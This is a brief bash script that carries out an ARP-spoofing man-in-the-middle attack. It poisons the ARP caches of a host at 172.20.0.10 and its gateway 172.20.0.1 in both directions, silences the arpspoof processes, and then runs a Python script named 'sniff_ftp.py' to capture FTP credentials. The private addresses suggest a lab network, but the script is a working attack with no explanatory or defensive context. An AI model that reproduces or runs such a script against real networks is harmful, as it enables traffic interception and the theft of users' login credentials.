#!/bin/bash

echo "[+] Starting ARP Spoofing..."
arpspoof -i eth0 -t 172.20.0.10 172.20.0.1 > /dev/null 2>&1 &
arpspoof -i eth0 -t 172.20.0.1 172.20.0.10 > /dev/null 2>&1 &

sleep 3
echo "[+] Sniffing FTP credentials..."
python3 sniff_ftp.py